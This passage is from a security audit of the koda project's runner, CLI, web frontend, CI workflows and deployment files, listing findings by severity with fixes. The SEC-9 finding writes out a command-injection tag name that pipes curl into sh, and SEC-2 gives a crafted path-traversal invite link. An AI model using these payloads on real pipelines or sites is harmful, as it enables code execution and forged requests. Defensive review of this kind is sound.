- **Fix:** in the loop, also require `matchesProcess(row)` every N ticks, or treat a status.json heartbeat older than `readoptHeartbeatMs` as dead and escalate. Return false for EPERM: the runner owns its nax, so EPERM means the process is not ours.

#### OPS-1 [MEDIUM]: The launchd plist restarts unconditionally and its log file grows without bound
- **File:** `apps/runner/src/service/units.ts:109-120` (plist) vs `:72-75` (systemd)
- **Code:** `<key>KeepAlive</key><true/>` ... `<key>StandardOutPath</key><string>${spec.runnerHome}/runner.log</string>`
- **Failure scenario:**
  - systemd stops on exit 2 (`RestartPreventExitStatus=2`, server refused the key or protocol). launchd restarts every 10 s forever, and each restart calls `/fleet/runner/me` and `/sync` with a revoked key.
  - `runner.log` is appended forever with JSON log lines (sync backoff warnings, per-job info) and has no rotation. On a long-lived Mac runner this slowly fills the disk.
- **Fix:**
  - Use `KeepAlive` as a dict: `{ SuccessfulExit: false }`. Have `run` exit 0 for "stopped by server" under launchd, or write a marker that makes the next start exit 0 immediately.
  - Add a newsyslog.d entry, or have the daemon rotate the file by size.

---

### LOW

#### BUG-3 [LOW]: `pruneJobs` throws outside its try blocks; from the interval this is an unhandled rejection
- **File:** `apps/runner/src/daemon/daemon.ts:78-79,259`
- **Code:** `const jobDir = assertInside(jobsRoot, pruned.jobDir);` (not in a try); called as `void pruneJobs(journal, config, log)`.
- **Scenario:**
  1. The operator changes `workspaceRoot` in runner.json while finished rows still name the old `.jobs`.
  2. After `jobRetentionDays`, `journal.prune` deletes those rows (the transaction commits first). Then `assertInside` throws a PathError.
  3. From `setInterval` this rejection is unhandled, and the runner installs no `unhandledRejection` handler, so the daemon exits. At startup the same throw fails `startDaemon` once.
  4. The rows are already gone, so the old job directories are orphaned forever.
- **Fix:** move `assertInside` into the try, log, and continue. Wrap the interval body in `.catch(log.warn)`.

#### MEM-1 [LOW]: The credential socket buffers without limit and starts a new poll per chunk after the first newline
- **File:** `apps/runner/src/credentials/cred-server.ts:24-38`
- **Scenario:** a same-uid client sends `get\n` and then keeps streaming data. Each `data` chunk appends to `buffered` (the 64-byte cap applies only before a newline) and calls `reply()` again. Each call polls for up to `serveWaitMs`.
- **Fix:** after the first newline, stop reading: `socket.pause()` or remove the listener. Set a reply-in-flight flag.

#### BUG-4 [LOW]: The cancel path signals the pgid without the D65 identity check
- **File:** `apps/runner/src/supervisor/job-run.ts:193-197` (SIGTERM), `:376-382` (SIGKILL)
- **Scenario:** this contradicts the runner rule "Signal only -pgid, and only after matchesProcess confirms" (`apps/runner/.nax context`). Combined with BUG-2's recycled pid, a CANCEL could signal an unrelated process group. `killIfOurs` does the check; `sendTerm` and `escalateKill` do not.
- **Fix:** gate on `await executor.matchesProcess(row)`, as `killIfOurs` does.

#### SEC-3 [LOW]: The runner accepts `file:` clone URLs on ASSIGN
- **File:** `apps/runner/src/executor/workspace.ts:7,10-18`
- **Scenario:** the server only builds https URLs (`apps/api/src/fleet/git-broker/clone-url.ts:10-16`). A compromised or misconfigured server could still make the runner clone any local repository and bundle its nax output back. `cleanProjectRepos` already insists on https (`assign-parser.ts:124`).
- **Fix:** allow `file:` only behind a test-only flag, as `mirror-store`'s `allowFileProtocol` does.

#### SEC-4 [LOW]: The journal (relay secrets, ASSIGN payloads) is left at umask permissions when the daemon runs as root
- **File:** `apps/runner/src/journal/journal.ts:9,53-57`
- **Code:** `const SKIP_FILEMODE = ... || process.getuid() === 0;`
- **Fix:** always chmod 0600. Root can chmod.

#### SEC-5 [LOW]: The enrollment token is passed on argv and the CLI prints the argv form
- **Files:** `apps/runner/src/main.ts:35` (`--token <token>`), `apps/cli/src/commands/fleet-runner.ts:96`
- **Scenario:** the single-use token appears in shell history and `ps` until it is used.
- **Fix:** print `KODA_RUNNER_ENROLL_TOKEN=... koda-runner enroll --server ...` or `--token -` (stdin), and accept stdin.

#### BUG-5 [LOW]: `koda auth logout` revokes the resolved credential but always deletes the global key
- **File:** `apps/cli/src/commands/auth.ts:84-87`
- **Scenario:** inside a repo whose `.koda/config.json` selects `profile: work`, logout revokes the work user's tokens and then deletes the unrelated global (personal) key. The work profile key stays stored.
- **Fix:** clear the credential that was actually used: profile, global, or none for env/flag.

#### SEC-8 [LOW]: Secrets still passed on CLI argv (prior LOW, partially open)
- **Files:** `apps/cli/src/commands/auth.ts:50` (`--password`), `commands/user.ts:64` (`--password`), `commands/webhook.ts:21` (`--secret`)
- **Fix:** route them through `resolveSecret` with a `[value]` optional flag, as `--api-key` and `--token` already do.

#### SEC-9 [LOW]: Repo config can still select which of the user's profiles is used (H10 residual)
- **File:** `apps/cli/src/config.ts:154-155`
- **Scenario:** a cloned repo sets `profile: prod`, so ticket writes go to the user's production server with the prod key. The URL and key stay consistent, and both are the user's own, so this is not credential theft.
- **Fix:** honor `profile` only when it matches a profile the user has marked as allowed for that directory, or print which profile is active on writes.

#### STYLE-2 [LOW]: Credential precedence is asymmetric, and the auth hint recommends the argv form
- **Files:** `apps/cli/src/config.ts:165-170` (`??` for apiKey vs `||` for apiUrl), `apps/cli/src/utils/error.ts:122`
- **Scenario:** `KODA_API_KEY=` (empty) yields `apiKey=''` and does not fall back to the profile or global key. The 401 hint suggests `koda config set --api-key <key>`, which `secret-input.ts:53-57` itself warns against.
- **Fix:** use `||` for apiKey. Change the hint to `koda login --api-key -`.

#### PROTO-1 [LOW]: `SyncResponse.nextPollAfterMs` is dead, and the API's protocol comment is stale
- **Files:** `packages/fleet-protocol/src/index.ts:285` (declared); no producer in `apps/api/src/fleet/sync/sync.service.ts:106-108`; no consumer in `apps/runner/src`. `apps/api/src/fleet/common/protocol.ts` ("The package stays at 3 until the runner ships") vs `FLEET_PROTOCOL_VERSION = 4`.
- **Fix:** remove the field, or implement it. Update the comment.
- No other drift was found: the API re-exports the package types type-only. The runtime mirrors `nax-config-paths.ts` and `config-jobs.ts` hold only values and are pinned by `nax-config-paths.spec.ts`. The runner's `SYNC_LIMITS` equal the parser's `SYNC_LIMITS` (`sync-request.parser.ts:4`), and the event, ack and token-request bounds match.

#### STYLE-3 [LOW]: File size
- **File:** `apps/runner/src/thread/thread-job-run.ts` is 1045 lines, over the 800 cap. `supervisor/job-run.ts` is 642. Split the turn/stream handling out of `ThreadJobRun`. Note: thread-job-run.ts was outlined only, not read line by line, in this pass.

#### ENH-1 [LOW]: The systemd unit has no sandboxing directives, and `Restart=always` loops on config errors
- **File:** `apps/runner/src/service/units.ts:62-75`
- **Fix:**
  - Add `NoNewPrivileges=yes`, `ProtectSystem=full`, `ProtectHome=read-only` plus `ReadWritePaths=<runnerHome> <workspaceRoot> <naxHome>`, and `PrivateTmp=yes`. With PrivateTmp, the default socket dir stays private to the service.
  - Exit 1 (bad config, not enrolled) restarts every 5 s forever. Consider `StartLimitIntervalSec`/`StartLimitBurst`, or a distinct exit code for permanent config errors that is added to `RestartPreventExitStatus`.

---

### Verified clean (no finding)
- **No shell use:** every spawn is argv-based. The only shell strings are the git `credential.helper` and shim scripts, both built with POSIX single-quote escaping (`credentials/job-files.ts:6-18`) from `process.execPath` and a hashed socket path.
- **nax argv:** feature, profiles and planFrom are re-validated (`executor/nax-process.ts:11-22`). Reserved prefix `koda-job-` is refused.
- **Path traversal:**
  - Owner, repo, jobId, feature, threadId, sourceId and sha all go through `paths/safe-segment.ts`. `assertInside` guards jobDir.
  - Skill files: lstat walk, `O_NOFOLLOW` and a realpath jail (`thread/tools/skill-files.ts:53-85`).
  - write_doc: allowlist, symlink walk and a realpath parent check (`thread/tools/write-doc.ts:22-47`).
  - Bundle: no symlink following, and list-unsafe names are skipped (`bundle/build-bundle.ts`).
- **Tokens:** never journaled or logged. Forge token variables are stripped from nax's environment (`credentials/credential-env.ts`). `git-cred` checks protocol and host and rejects CR/LF/NUL. The logger redacts by key name, and `sanitizeDiagnostic` redacts by value.
- **Journal:** WAL with `synchronous=FULL`. Event append plus row patch happen in one transaction. Seq is contiguous, and rejected events are replaced rather than deleted. Acks apply only to the epoch reported.
- **Approvals:** loopback only, HMAC verified with timingSafeEqual. The callback URL is pinned to `127.0.0.1/nax/interact/<id>`. Deadlines fail closed. Ask payloads are fitted under 16 KiB. Answers require the job to be RUNNING.
- **Supervision:** nax is detached with output to files. Daemon stop never signals children. The reap path checks pid start time (`executor/pid-registry.ts`), and `killIfOurs` checks argv.
- **Timers and listeners:** the daemon unrefs and clears its interval timers. Sleep and listener cleanup are correct (`time.ts`, log-shipper `waitForWake`).
- **CLI config:** written 0600 (`config.ts:30-38`). `withContext` centralizes resolution. Generated client untouched.

---

## Review E: apps/web + CI/release + container/deploy

**Repo:** koda, main @ `44269581` (read-only review, 2026-10-18)
**Scope:** `apps/web` (server/, middleware, composables, lib, pages, components, nuxt.config.ts, Dockerfiles), `.github/workflows/{ci,release}.yml`, `docker-compose*.yml`, `apps/*/Dockerfile*`, `deployments/example/`.
**Method:** Read every Nitro server file, middleware, auth/api composables, the markdown sanitizer, the live (SSE) stream libs and hub, all workflows, compose files, Dockerfiles and deploy scripts. Cross-checked against API code (cookie extractor, logout, refresh, env validation, throttler and getClientIp) and the built Nitro output (`apps/web/.output/server/chunks/nitro/nitro.mjs`) for routing and path decoding. Tests and dev server were not run.

### Summary

| Severity | Count |
|:--|:--|
| CRITICAL | 0 |
| HIGH | 1 |
| MEDIUM | 11 |
| LOW | 12 |

The web BFF is in much better shape than on 09-25. Cookie names match the API, SSR forwards the cookie, the runtime catch-all proxy no longer shadows auth routes, the markdown pipeline fails closed, `:href` sinks go through `safeHref`/`safePrUrl`, and SSE proxies abort upstream when the client disconnects. The remaining defects are mostly in **session lifecycle**: the 15-minute cookie, refresh, logout and redirect behavior. Deploy defaults and release hygiene account for most of the rest.

#### Checked and found sound (not findings)
- **Open proxy / SSRF:** `server/api/[...].ts:20` builds `base + event.path`. The host is fixed, `/api/**` always contributes a leading `/`, and the SSE routes validate slug and thread id with strict regexes (`live-proxy.ts:12,42`).
- **Bypassing the httpOnly design via the catch-all:** traced. h3 1.15 decodes `event._path` before routing (`nitro.mjs:1937,2089-2094`, `%2F` excepted), and radix3 normalizes trailing slashes, so `/api/auth/%72efresh` and `/api/auth/refresh/` still reach `refresh.post.ts`. Dot segments are normalized by the browser before sending. No browser-reachable path sends the raw `{accessToken, refreshToken}` API body to JS.
- **Cookie flags:** `httpOnly`, `secure`, `sameSite: 'strict'`, `path: '/'` (`server/utils/api.ts:43-60`). The names `koda_token`/`koda_refresh` match `apps/api/src/auth/auth.module.ts:15-16`.
- **SSR cross-user leakage:** auth state is `useState('koda_user')` (`useAuth.ts:31`). Module-level `let hub`, `mutationEpoch` and `approvalsVersion` are created or mutated only on the client (`useProjectEvents.ts:12-20`, `useFleetApprovals.ts:14-17`). There is no `routeRules` cache.
- **XSS:** there are 3 `v-html` sites (`MarkdownEditor.vue:150`, `TicketActivity.vue:54`, `ThreadMessage.vue:31`), and all go through DOMPurify with a tag/attr allowlist, `class` restricted (`lib/markdown.ts:35-53`), and a re-sanitize after linkify (`thread-markdown.ts:348`). PR/VCS links use `safeHref`/`safePrUrl`/`safeHttpUrl`.
- **runtimeConfig:** only `public.apiBaseUrl: '/api'` is public. `apiInternalUrl` is server-only (`nuxt.config.ts:76-82`).
- **Listener/timer cleanup:** every `addEventListener`/`setInterval` found has a matching `onBeforeUnmount` cleanup (`layouts/default.vue:26-29`, `NotificationBell.vue:109-113`, `ApprovalInbox.vue:384-389`, `pages/index.vue:67-74`, `[ref].vue:251-252`, `useApprovalNotifications.ts:190-201`).
- **Unbounded lists:** the log viewer is capped (`MAX_LOG_ROWS = 5000`, `fleet-log-view.ts:4,48`). Thread messages are bounded by `MAX_PAGES = 50` x 200 (`thread-controller.ts:18-20`). The SSE dedupe window is 200.
- **CI:** `pull_request` only (no `pull_request_target`). The `changes` job passes PR SHAs via `env:` rather than inline interpolation (`ci.yml:49-61`).
- **Web image** runs as non-root `nuxt` (`apps/web/Dockerfile:72-96`). Swagger is gated on `ENV_NAME` and is off in the image (`ENV_NAME=production`, `apps/api/Dockerfile:99`).

---

### Prior findings in this area: status at HEAD

| ID (source) | Status | Evidence |
|:--|:--|:--|
| H8 cookie constants undeclared / names disagree with API | **Fixed** | `apps/web/server/utils/api.ts:24-25` `koda_token`/`koda_refresh` = `apps/api/src/auth/auth.module.ts:15-16` |
| H9 SSR drops cookies; caller headers overwritten | **Fixed** | `useApi.ts:192-196` (`useRequestFetch()` on server), `mergeHeaders` `useApi.ts:100-105,173-179`; `useAuth.ts:89-94` |
| M22 refresh never called / sends wrong cookie / logout every 15 min | **Partially fixed** | Refresh cookie sent as Bearer (`api.ts:87-95`, `refresh.post.ts:10-13`); client 401 refresh+retry (`useApi.ts:218-229`). **Residual:** SSR/middleware never refresh, so a full page load more than 15 min after the last refresh still lands on /login. See BUG-1. |
| M23 routeRules proxy shadows auth routes; target frozen at build | **Fixed** | No `routeRules` in `nuxt.config.ts`; runtime handler `server/api/[...].ts:16-28`; built route table registers `/api/auth/*` (`.output/.../nitro.mjs:12830-12836`) |
| M24 markdown renderer fails open into v-html | **Fixed** | `lib/markdown.ts:70-78` catch returns `escapeHtml` |
| M25 web state machine drifted from API | **Fixed** | `TicketActionPanel.vue:35` uses API `ticket.allowedActions` |
| M26 `ticket.assignee.name` missing from DTO | **Fixed** | `apps/api/src/tickets/dto/ticket-response.dto.ts:49,139` |
| LOW sanitizer allows `class` | **Fixed** | `lib/markdown.ts:35-53` (`language-*` on code, `mention-chip` on span only) |
| LOW route params not encoded | **Fixed except invites** | `apiPath` everywhere except `pages/invite/[token].vue:32` and `composables/useAuth.ts:57`. See SEC-2. |
| LOW duplicate comment toast | **Fixed** | `[ref].vue:233-236` toasts only on transition |
| CI: no web build, `.vue` not linted | **Fixed** | `ci.yml:122-151`; `apps/web/package.json:10` lints `{ts,vue}` |
| LOW CI path filters skip `turbo.json`, `.nax/**` | **Fixed** | `ci.yml:17-18,60` |
| LOW `packageManager` bun 1.0.0 vs CI | **Fixed** | `package.json:5` `bun@1.4.2` = CI `bun-version: "1.4.2"` |
| LOW `TURBO_TOKEN` build-arg vs BuildKit secret | **Open** | `release.yml:149,186` pass `TURBO_TOKEN=` as build-arg; Dockerfiles read `/run/secrets/TURBO_TOKEN` (`apps/web/Dockerfile:62-64`, `apps/api/Dockerfile:63-66`). No `secrets:` input, so the remote cache is silently unused. |
| LOW `workflow_dispatch` re-publish does not check out the tag | **Open, upgraded to MEDIUM** | `release.yml:124,161` `actions/checkout@v4` with no `ref:`. See BUG-4. |
| LOW release not gated on CI | **Open** | `release.yml` has no dependency on CI status or a test job |

---

### HIGH

#### BUG-1 [HIGH] Full page loads more than 15 min after the last refresh force a re-login despite a valid 7-day refresh cookie (M22 residual)
**Files:** `apps/web/server/utils/api.ts:43-50`, `apps/web/middleware/auth.global.ts:15-22`, `apps/web/composables/useAuth.ts:79-101`, `apps/web/server/api/auth/me.get.ts:10-13`
```ts
setCookie(event, ACCESS_COOKIE, data.accessToken, { ..., maxAge: 60 * 15 })   // api.ts:44-50
if (!auth.user.value) { await auth.fetchUser() }                               // auth.global.ts:15-17
if (!auth.isAuthenticated.value && !guestOnlyRoutes.includes(to.path)) return navigateTo('/login')
const accessToken = getCookie(event, ACCESS_COOKIE); if (!accessToken) return { user: null }  // me.get.ts:10-13
```
**Scenario:** The browser drops `koda_token` 15 minutes after it was last set. The only refresh path is the client-side 401 retry in `useApi` (`shouldRetryAfter401` requires `isClient`). If a user reloads, opens a new tab, or follows a bookmark after 15 idle minutes, the SSR middleware calls `/api/auth/me`. That route returns `{ user: null }` without trying the refresh cookie, and the middleware redirects to `/login`. On the client, hydration reruns the middleware, which calls `fetchUser` again (still no access cookie), so the user stays on /login. The 7-day refresh cookie is never used on this path, so the "logged out every 15 minutes" symptom from M22 persists for every full navigation.
**Fix:** Refresh inside the probe. In `me.get.ts`, when the access cookie is absent but `koda_refresh` is present, call `forwardToApi(event, '/auth/refresh', { cookieName: 'refresh' })`, `setAuthCookies` with the result, then call `/auth/me` with the new token. (Nitro `setCookie` on the in-process SSR fetch must be propagated to the outer response. The simplest way is to do the refresh in a Nitro server middleware for page requests.) Alternatively, have `fetchUser` call `refresh()` once when `user` is null and the request is not a guest route. Add an SSR test that sets only `koda_refresh` and expects the page to render authenticated.

---

### MEDIUM

#### SEC-1 [MEDIUM] Logout silently skips server-side revocation when the access cookie has expired or upstream fails
**File:** `apps/web/server/api/auth/logout.post.ts:9-19`
```ts
const accessToken = getCookie(event, ACCESS_COOKIE)
if (accessToken) {
  try { await forwardToApi(event, '/auth/logout', { method: 'POST' }) } catch { }
}
clearAuthCookies(event)
```
**Scenario:** API logout bumps `tokenVersion` to revoke every outstanding token (`apps/api/src/auth/auth.service.ts:135-142`). After 15 idle minutes the access cookie is gone, so the proxy never calls upstream. Only the browser cookies are cleared, and the refresh JWT stays valid server-side (7 days by default; 30 days under both compose files, see SEC-7). `forwardToApi` uses `ignoreResponseError: true` (`api.ts:107`), so a 401 or 5xx from upstream is also ignored. "Log out" therefore does not revoke a token that has already leaked.
**Fix:** If there is no access cookie but a refresh cookie exists, refresh first (or add an API logout that accepts the refresh token via `JwtRefreshGuard`), then call `/auth/logout`. Check `status` and log or surface a failed revocation instead of swallowing it.

#### BUG-2 [MEDIUM] `SameSite=Strict` plus no return-to sends every external deep link (email, GitHub, chat) to the home page
**Files:** `apps/web/server/utils/api.ts:46,55`; `apps/web/middleware/auth.global.ts:21`; `apps/web/pages/login.vue:89`
```ts
sameSite: 'strict'                 // api.ts:46,55
return navigateTo('/login')        // auth.global.ts:21 (no redirect query)
navigateTo('/')                    // login.vue:89
```
**Scenario:** The API sends notification emails with `WEB_PUBLIC_URL` links (`apps/api/src/config/email.config.ts:40-47`). Clicking `https://koda/.../tickets/KODA-12` from Gmail is a cross-site top-level navigation, so Strict cookies are not sent. SSR sees no session and redirects to `/login` (the redirect chain is still cross-site). On the client, hydration reruns the middleware, which finds the session (same-site XHR) and calls `navigateTo('/')`. The user ends up on Home, not the ticket. The same loss happens after any genuine /login bounce, including BUG-1.
**Fix:** Use `sameSite: 'lax'` for `koda_token`. Lax still blocks cross-site POST/XHR (CSRF) and is the usual choice for session cookies; `koda_refresh` can stay Strict and be path-scoped (SEC-10). Also preserve the destination: `navigateTo({ path: '/login', query: { redirect: to.fullPath } })`, and on login `navigateTo` the validated same-origin `redirect` (must start with `/` and not `//`).

#### BUG-3 [MEDIUM] A brief API outage (deploy or restart) permanently stops live updates in every open tab and nulls the client user
**Files:** `apps/web/lib/project-event-stream.ts:195-212`, `apps/web/lib/thread-event-stream.ts:82-98`, `apps/web/composables/useAuth.ts:107-115`, `apps/web/server/utils/live-proxy.ts:97-106`
```ts
const ok = await deps.refreshAuth()
if (!ok) { stopped = true; return }          // stream gives up for good
...
async function refresh() { try { await $fetch('/api/auth/refresh', ...) ; return true }
  catch { user.value = null; return false } } // any failure == logged out
```
**Scenario:** During an API restart, the open SSE body ends, the browser reconnects, and `fetch` to the API fails. The Nitro route then answers 502 (`live-proxy.ts:100-101`), so `EventSource` goes CLOSED and `recover()` calls `refresh()`. `/api/auth/refresh` also fails while the API is down, so `refresh()` returns false and sets `user.value = null`, and the stream sets `stopped = true`. Every open project, thread and notification stream stops for the rest of the page's life, and the layout hides user-only UI (`<NotificationBell v-if="auth.user.value">`, `layouts/default.vue:363`) until the next navigation. Auth failure and upstream unavailability are treated the same.
**Fix:** Have `refresh()` return a tri-state (`'ok' | 'unauthorized' | 'unavailable'`) and only clear `user` on 401/403. In `recover()`, keep retrying with the capped backoff for `'unavailable'` and do not call refresh for a 502/503 from the live proxy. The proxy could return 503 with a `retry` hint so the client can tell outage from auth.

#### SEC-2 [MEDIUM] The invite token is interpolated raw into API paths (client-side path traversal), and the `apiPath` guard cannot see it
**Files:** `apps/web/pages/invite/[token].vue:19,32`, `apps/web/composables/useAuth.ts:57`, `apps/web/tests/lib/api-path-guard.spec.ts:10`
```ts
const token = route.params.token as string                                   // vue-router decodes %2F
preview.value = await $api.get<InvitePreview>(`/invites/${token}`)
await $fetch(`/api/invites/${token}/accept`, { method: 'POST', body })      // useAuth.ts:57
const API_ROOT = String.raw`(?:api\/)?(?:projects|agents|comments|admin|code-intel|fleet)\/`  // no invites/threads/me/memory
```
**Scenario:** `/invite/..%2Fprojects%2Fdemo%2Flabels%3F` decodes to `../projects/demo/labels?`, and the browser normalizes the URL to `POST /api/projects/demo/labels?/accept`. The invite page is reachable signed in or out (`auth.global.ts:9-11`). A signed-in victim who opens a crafted invite link and submits the form sends a same-origin POST, with their session, to an attacker-chosen API path carrying the `{name, password}` they typed. The impact depends on which endpoints accept that body, but this is exactly the class `apiPath` was introduced to close. The guard spec misses it because its root list omits `invites`, `threads`, `me`, `memory`, `notifications` and `home`, and `$fetch` calls are not covered.
**Fix:** `apiPath\`/invites/${token}\`` and `` `/api${apiPath`/invites/${token}/accept`}` ``. Widen `API_ROOT` in the guard to any `/(api/)?[a-z-]+/` template with an interpolation, or invert it to flag every untagged template passed to `$api.*`/`$fetch`. Optionally validate `token` against the API's token alphabet in the page.

#### SEC-3 [MEDIUM] The example production compose falls back to public default JWT and API-key secrets
**File:** `deployments/example/docker-compose.yml:10-14`
```yaml
JWT_SECRET: ${JWT_SECRET:-change-me}
JWT_REFRESH_SECRET: ${JWT_REFRESH_SECRET:-change-me-refresh}
API_KEY_SECRET: ${API_KEY_SECRET:-change-me-api-key}
```
**Scenario:** An operator follows `deploy.sh` but leaves out a variable (for example, `.env` lacks `JWT_SECRET`). Env validation accepts any non-empty string (`apps/api/src/config/env.validation.ts:12-16`), so the API boots signing JWTs with the published string `change-me`, and anyone can mint an ADMIN token. `POSTGRES_PASSWORD` in the same file already fails closed (`:?`). The root `docker-compose.yml:19-25` fails closed correctly because an empty `${JWT_SECRET}` is rejected by Joi.
**Fix:** Use `${JWT_SECRET:?set JWT_SECRET}` (and the same for the other two). Also consider a Joi `.min(32)` and a denylist of `change-me*` in `env.validation.ts`.

#### SEC-4 [MEDIUM] The API production image runs as root
**File:** `apps/api/Dockerfile:68-108` (final stage has no `USER`)
**Scenario:** The API handles webhooks, VCS tokens, runner bundles and LanceDB files. Any RCE or path-write bug runs as uid 0 inside the container, with write access to `/app`, the `koda_data` volume and anything else mounted. The web image already drops to `nuxt` (`apps/web/Dockerfile:72-96`).
**Fix:** Mirror the web image: `addgroup -S -g 1001 koda && adduser -S -u 1001 koda`, `chown` `/app` and `/data` (LanceDB path), then `USER koda`. Make sure the `koda_data` volume is writable by that uid, for example with an init `chown` or a named volume populated at build.

#### SEC-5 [MEDIUM] Both compose files publish the API port, bypassing the BFF; x-client-ip is trusted from private-range peers
**Files:** `docker-compose.yml:15-16`, `deployments/example/docker-compose.yml:6-7`; `apps/api/src/main.ts:27-30`; `apps/web/server/utils/client-ip.ts:5-11`
```yaml
ports:
  - "${API_PORT:-3100}:3100"
```
**Scenario:** The API is reachable directly on 3100 alongside the web on 3101. The API trusts proxy headers from `10/8, 172.16/12, 192.168/16, loopback`, and `x-client-ip` is honored first and unfiltered from a trusted peer (`@nathapp/nestjs-common` `getClientIpByHeader`, `request-ip.js:250-253`). On Docker Desktop, behind any LB or reverse proxy on a private network, or with docker-proxy hairpin, every client appears to come from a trusted private address. A client can then send `x-client-ip: <random>` per request and get a fresh throttle bucket, which defeats `AUTH_LOGIN_LIMIT` brute-force protection (`auth.controller.ts:100`). Publishing the API also exposes the whole surface (runner, MCP, webhooks) on a second port the operator may not front with TLS.
**Fix:** Do not publish the API in the production compose files (`expose: ["3100"]`, since web reaches it as `http://api:3100`), or bind `127.0.0.1:${API_PORT}:3100` for `deploy.sh`'s health check. Narrow `trustedProxies` to the web container's network (configurable via env, like store-erp's `TRUSTED_PROXIES`).

#### SEC-6 [MEDIUM] The `rag` profile publishes an unauthenticated Ollama on all interfaces, using the floating `latest` tag
**File:** `docker-compose.yml:101-116`
```yaml
image: ollama/ollama:latest
ports: ["11434:11434"]
environment: { OLLAMA_HOST: 0.0.0.0 }
```
**Scenario:** Ollama has no auth. Anyone who can reach the host can pull, delete or run models (disk and CPU abuse) or read model metadata, and `latest` changes under you. The API only needs container-to-container access.
**Fix:** Drop `ports:` (the API reaches `http://ollama:11434` on the compose network) or bind `127.0.0.1:11434:11434`, and pin a version tag or digest.

#### SEC-7 [MEDIUM] Compose overrides the API's short-lived access token to 7 days (refresh to 30 days)
**Files:** `docker-compose.yml:20,22`, `deployments/example/docker-compose.yml:11,13` (also `docker-compose.dev.yml:13,15`)
```yaml
JWT_EXPIRES_IN: ${JWT_EXPIRES_IN:-7d}
JWT_REFRESH_EXPIRES_IN: ${JWT_REFRESH_EXPIRES_IN:-30d}
```
**Scenario:** The API default is 15m/7d (`env.validation.ts:13,15`), and the web assumes a 15-minute access window (`api.ts:49`). Every compose-based deployment instead issues 7-day bearer access tokens, so a token leaked from logs, a proxy or a shared terminal stays valid for a week. Revocation also depends on the logout path, which can be skipped (SEC-1). The 30-day refresh JWT also outlives its 7-day cookie for no benefit.
**Fix:** Remove the overrides (let the API defaults apply) or set `${JWT_EXPIRES_IN:-15m}` / `${JWT_REFRESH_EXPIRES_IN:-7d}` to match the cookie lifetimes.

#### SEC-8 [MEDIUM] Release workflow grants write and OIDC permissions to every job, and third-party actions are tag-pinned
**File:** `.github/workflows/release.yml:15-18,89,126-136,163-173,197`
```yaml
permissions: { contents: write, packages: write, id-token: write }   # workflow-wide
uses: softprops/action-gh-release@v2 / docker/build-push-action@v6 / oven-sh/setup-bun@v2 ...
```
**Scenario:** The `info`, `docker-api`, `docker-web` and `notify` jobs do not need `contents: write` or `id-token: write`, but each gets them along with DockerHub and Telegram secrets. A compromised mutable tag on any third-party action (the tj-actions/changed-files class) can push a tag or release, mint an npm provenance OIDC token, or exfiltrate `DOCKERHUB_TOKEN`.
**Fix:** Set `permissions: {}` (or `contents: read`) at the top, then grant per job: `cli` gets `id-token: write, contents: read`; `release` gets `contents: write`. Pin third-party actions to full commit SHAs with a version comment, and let Dependabot (`github-actions` ecosystem) bump them.

#### BUG-4 [MEDIUM] (prior LOW, still open) `workflow_dispatch` re-publish builds the default branch and overwrites published version tags
**File:** `.github/workflows/release.yml:8-13,34,87,124,161`
**Scenario:** "Re-publish v0.4.0" checks out `main` HEAD (no `ref:`). If `package.json` still says 0.4.0, validation passes, and `docker-api`/`docker-web` push main's code as `nathapp/koda-*:v0.4.0`, `:0.4` and `:latest`. These jobs do not depend on `cli`, so they push even when `npm publish` fails on the duplicate version. A supposedly immutable version tag is silently replaced with different code, which breaks `rollback.sh`'s guarantees.
**Fix:** Use `actions/checkout@v4` with `ref: ${{ needs.info.outputs.tag }}` (via `refs/tags/...`) in every job. Gate the docker jobs on `cli` or on a "tag exists and equals HEAD" check, and consider refusing to overwrite an existing image digest.

---

### LOW

#### SEC-9 [LOW] Untrusted-ish expressions interpolated directly into `run:` scripts
**File:** `.github/workflows/release.yml:39,56,67-68,215`
```yaml
TAG="${{ github.event.inputs.tag || github.ref_name }}"
```
Git ref names may contain `$`, `(`, `)` and `|` (no spaces), and `v*.*.*` matches `v1.0.$(curl${IFS}x|sh)`. Exploiting it needs push or dispatch rights, so the gain is limited, but it is the standard injection pattern in a job holding `id-token: write`. **Fix:** pass values via `env:` (`TAG: ${{ inputs.tag || github.ref_name }}`) and reference `"$TAG"`. Validate the tag with a strict regex `^v[0-9]+\.[0-9]+\.[0-9]+(-canary\.[0-9]+)?$` in the first step.

#### SEC-10 [LOW] The refresh cookie is scoped to `/`, so it is sent on every request and forwarded upstream
**File:** `apps/web/server/utils/api.ts:52-59`; forwarded by `server/api/[...].ts:25` (proxyRequest forwards `cookie`) and by the SSE routes (`me/events.get.ts:11` etc.).
The 7-day refresh token travels to the API on every proxied call, SSE stream and SSR fetch, which widens its exposure in logs and traces. **Fix:** `path: '/api/auth'` for `koda_refresh` (it is only needed by `refresh.post.ts` and, after SEC-1, `logout.post.ts`), and delete it with the same path.

#### SEC-11 [LOW] No security headers or CSP on Nuxt responses
**File:** `apps/web/nuxt.config.ts` (no `routeRules` headers or `nitro` middleware). Strict cookies currently blunt clickjacking, because a cross-site frame is unauthenticated, but if BUG-2 moves the session cookie to Lax, framed pages become authenticated. There is also no CSP as defense in depth for the three `v-html` sinks. **Fix:** add `routeRules: { '/**': { headers: { 'X-Frame-Options': 'DENY', 'Content-Security-Policy': "frame-ancestors 'none'; ...", 'Referrer-Policy': 'strict-origin-when-cross-origin', 'X-Content-Type-Options': 'nosniff' } } }`, or use `nuxt-security`.

#### PERF-1 [LOW] No single-flight on token refresh
**Files:** `apps/web/composables/useApi.ts:218-229`, `useAuth.ts:107-115`. A page with N parallel requests made after cookie expiry fires N `POST /api/auth/refresh` calls and N retries; SSE `recover()` adds more. The API does not revoke on rotation, so this is not fatal, but it multiplies auth traffic and the throttled auth endpoints could 429. **Fix:** memoize the in-flight refresh promise in `useAuth` (for example `let inflight: Promise<boolean> | null`) and share it.

#### BUG-5 [LOW] `secure: true` is hard-coded on the auth cookies
**File:** `apps/web/server/utils/api.ts:47,56`. On an http deployment other than localhost (LAN IP, internal hostname), browsers drop the cookies. Login "succeeds" (`{ user }` sets client state), but the next SSR or API call is unauthenticated. **Fix:** derive the flag from runtime config (default true; `NUXT_COOKIE_SECURE=false` for http-only labs) and document it.

#### BUG-6 [LOW] `deploy.sh` health checks race `up -d`
**File:** `deployments/example/deploy.sh:70-77`. `up -d` waits for `api` to be healthy (web depends on it) but not for `web` to listen. The immediate `curl -fsS http://localhost:3101` can fail under `set -e` and report a failed deploy that actually succeeded. **Fix:** `docker compose up -d --wait api web` (the web healthcheck exists), or retry the curls.

#### ENH-1 [LOW] Production API image does not set `NODE_ENV=production`
